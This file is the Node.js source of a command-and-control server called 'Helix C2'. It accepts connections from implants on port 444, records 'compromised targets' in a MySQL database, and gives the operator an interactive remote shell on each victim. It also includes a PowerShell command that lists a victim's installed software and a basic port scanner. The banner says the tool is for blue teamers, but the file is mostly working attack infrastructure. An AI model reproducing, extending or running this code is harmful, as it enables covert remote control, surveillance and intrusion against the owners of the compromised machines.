const net = require("net");
const readline = require("readline");
const colors = require("colors");
const mysql = require("promise-mysql");
const config = require("./config/db/helix.json");

(async () => {
    const isAdmin = (await import("is-admin")).default;

    const isRoot = process.getuid && process.getuid() === 0;

    const checkAdminRights = async () => {
        const admin = await isAdmin();

        if (!admin && !isRoot) {
            console.error("[-] Helix must be run with admin privileges!".red);
            process.exit(1);
        } else if (isRoot) {
            console.log("[+] Running as root...".green);
        } else {
            console.log("[+] Running with admin privileges...".green);
        }
    };

    await checkAdminRights();
})();

let dbConnection;

async function initDB() {
    try {
        dbConnection = await mysql.createConnection(config);
    } catch (err) {
        console.error("Database connection failed: ", err.message);
    }
}

async function insertClientData(clientId, deviceFingerprint, clientAddress, os, connectionTime) {
    const query = `
        INSERT INTO targets (id, device_finger_print, ip, os, geolocation, connection_time, disconnection_time) 
        VALUES (?, ?, ?, ?, "Whale Island, Alaska, US", ?, NULL)
    `;
    
    try {
        await dbConnection.query(query, [clientId, deviceFingerprint, clientAddress, os, connectionTime]);
    } catch (err) {
        console.error("Failed to insert client data: ", err.message);
    }
}

initDB();

let clients = {};
let clientIdCounter = 0;
let server = null;

const header = `
    
    _    _      _ _          _____ ___  
   | |  | |    | (_)        / ____|__ \\ 
   | |__| | ___| |___  __  | |       ) |
   |  __  |/ _ \\ | \\ \\/ /  | |      / / 
   | |  | |  __/ | |>  <   | |____ / /_ 
   |_|  |_|\\___|_|_/_/\\_\\   \\_____|____|

   - Author: https://github.com/tr3sp4ss3rexe

   [!] Helix C2 currently available for blue teamers and network admins
   [!] More payloads will be added soon!
   _______________________________________________________________`;

function printHeader() {
    console.clear();
    console.log(header.green);
}

function setupListener(port = 444) {
    server = net.createServer((socket) => {
        const clientId = clientIdCounter++;
        const clientAddress = socket.remoteAddress.replace("::ffff:", "");
        const connectionTime = new Date();
        
        let os = "Unknown OS";
        let deviceFingerprint = "";
        let dataInserted = false;

        clients[clientId] = {
            socket: socket,
            clientAddress: clientAddress,
            connectionTime: connectionTime,
            data: "",
            interactiveMode: false
        };

        console.log(`Client ${clientId} connected from IP: ${clientAddress}`);

        
        socket.on("data", (data) => {
            const response = data.toString().trim();
        
            if (response.includes("OS:")) {
                os = response.match(/OS: (.+)/)[1];
            }
        
            if (response.match(/\b[0-9A-F]{4}_.+/)) {
                deviceFingerprint = response.match(/\b[0-9A-F]{4}_.+/)[0];
            }
        
            clients[clientId].data += response + "\n";
        
            if (!dataInserted) {
                insertClientData(clientId, deviceFingerprint, clientAddress, os, connectionTime);
                dataInserted = true;
            }
        
            if (clients[clientId].interactiveMode) {
                process.stdout.write(`${response}\n> `);
            }
        });
        

        socket.on("end", async () => {
            console.log(`Client ${clientId} disconnected.`);
        
            const disconnectionTime = new Date();
            await dbConnection.query(
                `UPDATE targets SET disconnection_time = ? WHERE id = ?`,
                [disconnectionTime, clientId]
            );
        
            delete clients[clientId];
        });
        

        socket.on("error", async (err) => {
            console.error(`Error with client ${clientId}: ${err.message}`);
        
            const disconnectionTime = new Date();
            await dbConnection.query(
                `UPDATE targets SET disconnection_time = ? WHERE id = ?`,
                [disconnectionTime, clientId]
            );
        
            delete clients[clientId];
        });
        
    });

    server.listen(port, () => {
        console.log(`TCP server is listening on port ${port}`);
    });
}


function killListener() {
    if (server) {
        server.close(() => {
            console.log("Listener stopped.");
        });
        server = null;
    } else {
        console.log("No listener to stop.");
    }
}

async function listClients() {
    if (Object.keys(clients).length > 0) {
        console.log("Connected Clients:");
        Object.keys(clients).forEach(clientId => {
            console.log(`Client ${clientId} (${clients[clientId].clientAddress})`);
        });
    } else {
        console.log("No clients connected.");
    }
}

function getClientInfo(clientId) {
    if (clients[clientId]) {
        console.log(`Client ${clientId} connected from IP: ${clients[clientId].clientAddress}`);
        console.log(`Connection time: ${clients[clientId].connectionTime.toLocaleString()}`);
        console.log(`Data received from client ${clientId}: ${clients[clientId].data}`);
    } else {
        console.log("Invalid client ID.");
    }
}

function interactWithClient(clientId) {
    if (clients[clientId]) {
        console.log(`\nEntering interactive shell with client ${clientId}...`);
        clients[clientId].interactiveMode = true;

        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: "> "
        });

        rl.prompt();

        rl.on("line", (command) => {
            if (command.toLowerCase() === "exit") {
                clients[clientId].interactiveMode = false;
                console.log(`Exiting interaction with client ${clientId}...`);
                rl.close();
                displayMenu();
            } else {
                if (clients[clientId]) {
                    clients[clientId].socket.write(command + "\n");
                    process.stdout.write(`Sent: ${command}\n`);
                } else {
                    console.log(`Client ${clientId} is no longer connected.`);
                }
                rl.prompt();
            }
        });

        
        rl.on("close", () => {
            clients[clientId].interactiveMode = false;
            console.log("\nExited interactive shell.");
            displayMenu();
        });
    } else {
        console.log("Invalid client ID or client not connected.");
        displayMenu();
    }
}

async function removeClient(clientId) {
    if (clients[clientId]) {
        clients[clientId].socket.end();
        delete clients[clientId];
        await dbConnection.query(`DELETE FROM targets WHERE id = ?`, [clientId]);
        console.log(`Client ${clientId} has been removed.`);
    } else {
        console.log("Invalid client ID.");
    }
}

function isPortOpen(ip, port, timeout = 2000) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        let isOpen = false;

        socket.setTimeout(timeout);

        socket.on("connect", () => {
            isOpen = true;
            socket.destroy();
        });

        socket.on("timeout", () => {
            socket.destroy();
        });

        socket.on("error", () => {
        });

        socket.on("close", () => {
            resolve(isOpen);
        });

        socket.connect(port, ip);
    });
}

async function checkOpenPorts(ip, ports) {
    console.log(`\nScanning ports on ${ip}...\n`.yellow);
    const scanResults = [];

    for (const port of ports) {
        process.stdout.write(`Checking port ${port}... `);
        const open = await isPortOpen(ip, port);
        if (open) {
            console.log(`Open`.green);
            scanResults.push(port);
        } else {
            console.log(`Closed`.red);
        }
    }

    if (scanResults.length > 0) {
        console.log(`\nOpen ports on ${ip}: ${scanResults.join(", ")}`.green);
    } else {
        console.log(`\nNo open ports found on ${ip}.`.red);
    }
}

function displayMenu() {
    printHeader();
    if (global.rl && !global.rl.closed) {
        global.rl.close();
    }
    global.rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log(`
    Listener handling: `.green)
    console.log(`    1) Start listener on port 444 (default)
    2) Kill listener`)
    console.log(`
    Target handling:`.green)    
    console.log(`    3) List compromised targets
    4) Interact with a target
    5) Show interaction logs
    6) List installed apps on a target
    7) Remove connected target`)
    console.log(`
    Target recon:`.green)
    console.log(`    8) Check for open ports`)
    console.log(`
    q) Exit\n`.red);

    global.rl.question("> ", (choice) => {
        switch (choice.trim()) {
            case "1":
                setupListener();
                waitForUserInput(global.rl);
                break;
            case "2":
                killListener();
                waitForUserInput(global.rl);
                break;
            case "3":
                listClients();
                waitForUserInput(global.rl);
                break;
            case "4":
                global.rl.question("Enter client ID to interact with: ", (clientId) => {
                    global.rl.close();
                    interactWithClient(clientId);
                });
                break;
            case "5":
                global.rl.question("Enter client ID to get interaction logs for: ", (clientId) => {
                    getClientInfo(clientId);
                    waitForUserInput(global.rl);
                });
                break;
            case "6":
                global.rl.question("Enter client ID for installed application list: ", (clientId) => {
                    if (clients[clientId]) {
                        console.log(`Fetching installed applications list for Client ${clientId}. This may take a while...`);

                        clients[clientId].socket.write(`powershell -Command "try { (Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' -ErrorAction Stop | Where-Object { $_.DisplayName -and $_.DisplayName -notmatch 'Microsoft|SDK|Windows|Visual C\\+\\+' } | Select-Object -ExpandProperty DisplayName) -join \\"\\\`n\\" } catch { Write-Error \\"Failed to retrieve installed applications: $_\\" }"\n`);


                        clients[clientId].interactiveMode = true;
            
                        const waitForOutput = readline.createInterface({
                            input: process.stdin,
                            output: process.stdout
                        });
            
                        waitForOutput.question("\n", () => {
                            waitForOutput.close();
                            clients[clientId].interactiveMode = false;
                            displayMenu();
                        });

                    } else {
                        console.log("Invalid client ID or client not connected.");
                        waitForUserInput(global.rl);
                    }
                });
                break;
            case "7":
                global.rl.question("Enter client ID to remove: ", (clientId) => {
                    removeClient(clientId);
                    waitForUserInput(global.rl);
                });
                break;
            case "8":
                global.rl.question("Enter IP address to scan: ", async (ip) => {
                    const common_ports = [20, 21, 22, 53, 80, 443, 444, 445, 1337, 3306, 3389];
                    const ipRegex = /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)){3}$/;
                    if (!ipRegex.test(ip.trim()) || ip == "127.0.0.1") {
                        console.log("[-] Invalid IP address...".red);
                        waitForUserInput(global.rl);
                        return;
                    }
                    await checkOpenPorts(ip.trim(), common_ports);
                    waitForUserInput(global.rl);
                });
                break;
            case "q":
                console.log("Exiting...");
                global.rl.close();
                if (server) server.close();
                process.exit(0);
            default:
                console.log("Invalid choice. Please try again.");
                waitForUserInput(global.rl);
                break;
        }
    });
}

function waitForUserInput(rl) {
    rl.question("\nPress enter to continue...\n", () => {
        rl.close();
        console.clear();
        displayMenu();
    });
}

displayMenu();
